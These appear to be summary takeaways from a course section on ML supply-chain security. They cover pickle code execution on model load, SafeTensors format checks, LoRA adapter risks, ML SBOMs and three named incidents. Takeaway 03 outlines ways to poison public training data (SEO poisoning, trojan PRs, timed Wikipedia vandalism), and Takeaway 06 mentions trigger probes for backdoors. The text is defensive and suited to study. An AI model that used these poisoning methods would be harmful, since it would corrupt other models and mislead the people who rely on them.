ML models are executables. Loading a PyTorch .bin file with torch.load() is equivalent to running an untrusted binary. This is not a metaphor — pickle's __reduce__ protocol enables arbitrary shell command execution on model load. SafeTensors eliminates this by restricting the format to tensor data only, making code execution structurally impossible.

Takeaway 02

The AI supply chain has six distinct layers each with independent attack surfaces: dataset acquisition, preprocessing, base model download, fine-tuning and adapters, framework dependencies, and model registry/serving. A control at one layer does not compensate for a gap at another. Defence-in-depth across all six is required.

Takeaway 03

Public datasets (Common Crawl, GitHub, Wikipedia) are adversary-writable. SEO poisoning of Common Crawl, trojan PRs to GitHub repositories, and Wikipedia vandalism during snapshot windows are all documented or technically feasible mechanisms for training data contamination without any access to victim infrastructure.

Takeaway 04

LoRA adapters are a unique supply chain risk: cheap to produce, often downloaded and verified separately from the base model, and in dynamic serving architectures can be swapped at runtime without a deployment event. Every adapter in every composition stack must be independently hashed, registered, and monitored.

Takeaway 05

The ML SBOM captures what traditional software SBOMs miss: training datasets, base model identity and format, adapter provenance, and fine-tuning lineage. Without an ML SBOM, an organisation cannot answer the question "which of our production models is affected by this CVE?" or "did this model's training data include data from source X that we now know is compromised?"

Takeaway 06

Download count and HuggingFace star count are not security signals. Adversaries artificially inflate these metrics. The only reliable signals are: SafeTensors format (structural, not gameable), SHA-256 hash match against a known-good record, model card completeness (partial signal), and behavioural regression test on a trigger-probe suite.

Takeaway 07

Two format checks block the primary ML supply chain attack vector with zero false positives and zero tuning: (1) verify file_header[0:2] NOT in pickle magic bytes, (2) verify file_header[8:9] == '{' for SafeTensors. These two checks, implemented at model intake, eliminate pickle RCE from the supply chain without any impact on legitimate SafeTensors models.

Takeaway 08

The three documented incidents (Protect AI 2023, HuggingFace Spaces 2024, JFrog 2023) share a common root cause: implicit trust in a public model hub without structural format verification. Obfuscation (JFrog finding) defeats content-based scanning but not structural format validation — SafeTensors enforcement is the correct defence, not pattern matching on file contents.

The section closes with the six-check artifact verification pipeline (format, hash, model card, dependency scan, sandbox load, behavioural regression) and analysis of three documented 2023-2024 supply chain incidents (Protect AI, HuggingFace Spaces, JFrog) mapped to ATLAS techniques with lessons applied.
